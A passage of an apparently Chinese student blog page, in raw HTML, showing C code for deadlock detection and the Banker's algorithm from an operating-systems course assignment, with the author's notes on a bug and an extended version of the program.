0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">    for(j = 0;j&lt;m;j++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%d &quot;,B[i][j]);</span></span><br><span class="line"><span class="comment">&#125; </span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">//**------------------------------------------------------------------------------- </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入可用资源量a：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;m;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*printf(&quot;\n可用资源量a存储情况：&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;m;i++) printf(&quot;%d&quot;,a[i]);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">printf(&quot;flag存储情况：&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;n;i++) printf(&quot;%d&quot;,flag[i]);*/</span></span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//矩阵计算：</span></span><br><span class="line">b = n+<span class="number">1</span>;</span><br><span class="line">to2:</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"> f = <span class="number">0</span>; </span><br><span class="line"> <span class="keyword">if</span>(flag[i]==<span class="number">1</span>)<span class="keyword">continue</span>;<span class="comment">//若该程序有标记则跳过该程序 </span></span><br><span class="line"> <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(a[j]&gt;=B[i][j])f++;</span><br><span class="line"> <span class="keyword">if</span>(f==m)&#123;</span><br><span class="line"> flag[i]=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)&#123;</span><br><span class="line"> a[k] += A[i][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;$ &quot;);</span></span><br><span class="line"><span class="keyword">while</span>(b--)<span class="keyword">goto</span> to2;<span class="comment">//最坏情况一次只为一个程序标记flag，那么循环n次也能够标记所有能够标记的程序 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判定标记：</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]==<span class="number">1</span>)f++;</span><br><span class="line"><span class="keyword">if</span>(f==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;存在死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n是否继续进行下一组测试？[Y/N]:&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*--------------------------------------------------------------------------------*\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(ch == <span class="string">&#x27;Y&#x27;</span> || ch == <span class="string">&#x27;y&#x27;</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>de出一个小bug：</p><p><img src="image-20211107162936095.png" alt="image-20211107162936095"></p><p>思考了一下，总结了一下原因：第1个条件中占据资源全为0的进程不会造成死锁，这是默认了单个进程的所需资源数小于系统总的所拥有的资源数这一条件，倘若这一条件不成立则会出现以上情况。</p><p>所以要改的话，只需要加一个记录系统总资源数的数组，然后跟需求矩阵的各进程所需资源作比较，若出现所需大于所拥有的情况，弹出错误提示，退出程序即可。说完了，还不懂的话来问我就行</p><p>我挺喜欢跟别人讨论问题的，所以有问题尽管找我^_^</p><p>wx : xy1724252720</p><p>看到别人都弄了安全序列，我也弄一个吧，同时把goto都改成while吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x,y,c[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">do</span>&#123;start();&#125;<span class="keyword">while</span>(end());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//基本数据输入： </span></span><br><span class="line"><span class="keyword">int</span> b,i,j,k,m,n,f;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入进程个数n：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入资源维数m：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">x = <span class="number">0</span>;y = n<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> A[n][m],C[n][m],B[n][m],a[m],flag[n]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入需求矩阵C：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;C[i][j]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入分配矩阵A：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123; </span><br><span class="line">    f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;A[i][j]);</span><br><span class="line"><span class="keyword">if</span>(A[i][j]==<span class="number">0</span>)f++;<span class="comment">//记录分配矩阵中一个进程中各维元素为0的个数 </span></span><br><span class="line">B[i][j] = C[i][j]-A[i][j];<span class="comment">// B 为 C-A 伴随矩阵 </span></span><br><span class="line"><span class="keyword">if</span>(f==m)&#123;</span><br><span class="line">flag[i]=<span class="number">1</span>;<span class="comment">//若全为0，则做标记 </span></span><br><span class="line">c[y] = i;y--;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**------------------------------------------------------------------------------- </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入可用资源量a：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;m;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//矩阵计算：</span></span><br><span class="line">b = n+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(b--)&#123;<span class="comment">//最坏情况一次只为一个程序标记flag，那么循环n次也能够标记所有能够标记的程序 </span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"> f = <span class="number">0</span>; </span><br><span class="line"> <span class="keyword">if</span>(flag[i]==<span class="number">1</span>)<span class="keyword">continue</span>;<span class="comment">//若该程序有标记则跳过该程序 </span></span><br><span class="line"> <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(a[j]&gt;=B[i][j])f++;</span><br><span class="line"> <span class="keyword">if</span>(f==m)&#123;</span><br><span class="line"> flag[i]=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)&#123;</span><br><span class="line"> a[k] += A[i][k];</span><br><span class="line">&#125;</span><br><span class="line">c[x] = i;x++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判定标记：</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]==<span class="number">1</span>)f++;</span><br><span class="line"><span class="keyword">if</span>(f==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无死锁\n安全序列：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;n;j++)<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,c[j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n安全序列+1：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;n;j++)<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,c[j]+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;存在死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n是否继续进行下一组测试？[Y/N]:&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*--------------------------------------------------------------------------------*\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(ch == <span class="string">&#x27;Y&#x27;</span> || ch == <span class="string">&#x27;y&#x27;</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="银行家算法plus"><a href="#银行家算法plus" class="headerlink" title="银行家算法plus"></a>银行家算法plus</h3><p>之前老师的要求没给全，导致我写的银行家算法功能不太全，现在课设要求更高了，写一个更加完善一点的银行家算法做记录，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void start();</span><br><span class="line">int end();</span><br><span class="line"></span><br><span class="line">int x,y,y1,c[1000],c1[1000];</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">do&#123;start();&#125;while(end());</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void start()</span><br><span class="line">&#123;</span><br><span class="line">//基本数据输入： </span><br><span class="line">int b,i,j,k,m,n,n1,f,f1;</span><br><span class="line">char ch;</span><br><span class="line">printf(&quot;请输入进程个数n：&quot;); </span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">printf(&quot;请输入资源维数m：&quot;); </span><br><span class="line">scanf(&quot;%d&quot;,&amp;m);</span><br><span class="line">x = 0;y = n-1;</span><br><span class="line">int A[n][m],C[n][m],B[n][m],a[m],xu[m],flag[n]=&#123;0&#125;;</span><br><span class="line">int A1[n][m],C1[n][m],B1[n][m],a1[m],a2[m],xu1[m],flag1[n]=&#123;0&#125;;</span><br><span class="line">//**-------------------------------------------------------------------------------</span><br><span class="line">printf(&quot;请输入需求矩阵C：\n&quot;);</span><br><span class="line">for(i = 0;i&lt;n;i++)</span><br><span class="line">for(j = 0;j&lt;m;j++) scanf(&quot;%d&quot;,&amp;C[i][j]);</span><br><span class="line">//**-------------------------------------------------------------------------------</span><br><span class="line">printf(&quot;请输入分配矩阵A：\n&quot;);</span><br><span class="line">for(i = 0;i&lt;n;i++)&#123; </span><br><span class="line">    f = 0;</span><br><span class="line">for(j = 0;j&lt;m;j++)&#123;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;A[i][j]);</span><br><span class="line">if(A[i][j]==0)f++;//记录分配矩阵中一个进程中各维元素为0的个数 </span><br><span class="line">B[i][j] = C[i][j]-A[i][j];// B 为 C-A 伴随矩阵 </span><br><span class="line">if(f==m)&#123;</span><br><span class="line">flag[i]=1;//若全为0，则做标记 </span><br><span class="line">c[y] = i;y--;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">//**------------------------------------------------------------------------------- </span><br><span class="line">printf(&quot;请输入当前系统可用资源量a：&quot;);</span><br><span class="line">for(i = 0;i&lt;m;i++) scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">//**输出所有矩阵及可用资源量-------------------------------------------------------</span><br><span class="line">to2://*****************************************************************************************************************************to2在这 </span><br><span class="line">printf(&quot;  需 求 矩 阵        分 配 矩 阵    伴 随 矩 阵    可 用 资 源 量\n&quot;) ;</span><br><span class="line">for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">if(i&gt;0)printf(&quot;\n&quot;); </span><br><span class="line">printf(&quot;进程%d：&quot;,i);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,C[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,A[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,B[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">if(i==0)&#123;</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,a[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//**-------------------------------------------------------------------------------</span><br><span class="line">printf(&quot;\n请输入即将申请资源的进程号(&lt;=n-1)：&quot;);</span><br><span class="line">//getchar();</span><br><span class="line"></span><br><span class="line">to1://*****************************************************************************************************************************to1在这 </span><br><span class="line">fflush(stdin);</span><br><span class="line">for(i=0;i&lt;1000000;i++)i++;</span><br><span class="line"></span><br><span class="line">scanf(&quot;%d&quot;,&amp;n1);</span><br><span class="line">if(n1&gt;=n)&#123;</span><br><span class="line">printf(&quot;该进程不存在,请重新输入：&quot;);</span><br><span class="line">goto to1; //就用goto </span><br><span class="line">&#125;</span><br><span class="line">//基本判断：</span><br><span class="line">//**判断1-------------------------------------------------------------------------- </span><br><span class="line">printf(&quot;请输入该进程所需的各资源量：&quot;); </span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;xu[j]); </span><br><span class="line">if(xu[j]&gt;B[n1][j])&#123;</span><br><span class="line">printf(&quot;资源请求过度，请求驳回，请输入下一资源申请进程号：&quot;);</span><br><span class="line">goto to1; //就用goto</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">//**判断2--------------------------------------------------------------------------</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">if(xu[j]&gt;a[j])&#123;</span><br><span class="line">printf(&quot;当前系统资源无法满足该资源请求，请求驳回，请输入下一资源申请进程号：&quot;);</span><br><span class="line">goto to1; //就用goto</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//**判断3--------------------------------------------------------------------------</span><br><span class="line">//首先，将新数据存入新数组，因为不安全的话要恢复数据，所以要用新数组 ，进程号: n1,申请的各资源量: xu[m] </span><br><span class="line">int f2 = 0;</span><br><span class="line">y1 = n-1;</span><br><span class="line">for(i=0;i&lt;n;i++)</span><br><span class="line">for(j=0;j&lt;m;j++)</span><br><span class="line">C1[i][j]=C[i][j];//新需求矩阵 </span><br><span class="line"></span><br><span class="line">for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">f1=0;</span><br><span class="line">f2=0;</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">if(i==n1)&#123;</span><br><span class="line">A1[i][j]=A[i][j]+xu[j];//新分配矩阵 </span><br><span class="line">B1[i][j]=C1[i][j]-A1[i][j];//新伴随矩阵</span><br><span class="line">if(B1[i][j]==0)f2++; </span><br><span class="line">if(A1[i][j]==0)f1++;</span><br><span class="line">/*if(f2==m)&#123;</span><br><span class="line">a1[j]=a[j]-xu[j];</span><br><span class="line">for(k=0;k&lt;m;k++)a1[j]+=B1[i][j];</span><br><span class="line">&#125;</span><br><span class="line">else a1[j]=a[j]-xu[j];//新系统剩余资源量 */</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">A1[i][j]=A[i][j];//新分配矩阵 </span><br><span class="line">B1[i][j]=B[i][j];//新伴随矩阵</span><br><span class="line">if(B1[i][j]==0)++f2; </span><br><span class="line">if(A1[i][j]==0)++f1;</span><br><span class="line">&#125;</span><br><span class="line">//printf(&quot;\n@@@@@@@f2=%d\n&quot;,f2);</span><br><span class="line">if(i==n1 &amp;&amp; f2==m)&#123;</span><br><span class="line">//printf(&quot;\n@@@@@@@\n&quot;);</span><br><span class="line">a1[j]=a[j]-xu[j];</span><br><span class="line">for(k=0;k&lt;m;k++)a1[k]=a1[k]+A1[i][k];</span><br><span class="line">//printf(&quot;\nA1[%d]=%d&quot;,k,A1[i][k]);</span><br><span class="line">//printf(&quot;\na1[%d]=%d&quot;,k,a1[k]);</span><br><span class="line">&#125;</span><br><span class="line">else if(i==n1 &amp;&amp; f2!=m)a1[j]=a[j]-xu[j];</span><br><span class="line">/*else &#123;</span><br><span class="line">a1[j]=a[j]-xu[j];//新系统剩余资源量 </span><br><span class="line">&#125;*/</span><br><span class="line"> </span><br><span class="line">if(f1==m)&#123;</span><br><span class="line">//*****************************************************************************************这里，新标记、 弄懂c[y]在干嘛 </span><br><span class="line">flag1[i]=1;//若全为0，则做标记 </span><br><span class="line">c1[y1] = i;y1--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">for(i=0;i&lt;m;i++)a2[i] = a1[i];</span><br><span class="line">//for(i=0)</span><br><span class="line"></span><br><span class="line">printf(&quot;申请后的矩阵、系统资源情况如下:\n&quot;); </span><br><span class="line">printf(&quot;  需 求 矩 阵        分 配 矩 阵    伴 随 矩 阵    可 用 资 源 量\n&quot;) ;</span><br><span class="line">for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">if(i&gt;0)printf(&quot;\n&quot;); </span><br><span class="line">printf(&quot;进程%d：&quot;,i);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,C1[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,A1[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,B1[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">if(i==0)&#123;</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,a1[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//**------------------------------------------------------------------------------- </span><br><span class="line">//矩阵计算，安全判断：</span><br><span class="line">b = n+1;</span><br><span class="line">x = 0;</span><br><span class="line">while(b--)&#123;//最坏情况一次只为一个程序标记flag，那么循环n次也能够标记所有能够标记的程序 </span><br><span class="line">for(i = 0;i&lt;n;i++)&#123;</span><br><span class="line"> f1 = 0; </span><br><span class="line"> if(flag1[i]==1)continue;//若该程序有标记则跳过该程序 </span><br><span class="line"> for(j = 0;j&lt;m;j++)&#123;</span><br><span class="line"> if(a2[j]&gt;=B1[i][j])f1++;</span><br><span class="line"> if(f1==m)&#123;</span><br><span class="line"> flag1[i]=1;</span><br><span class="line"> for(k=0;k&lt;m;k++)&#123;</span><br><span class="line"> a2[k] += A1[i][k];</span><br><span class="line">&#125;</span><br><span class="line">c1[x] = i;x++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//判定标记：</span><br><span 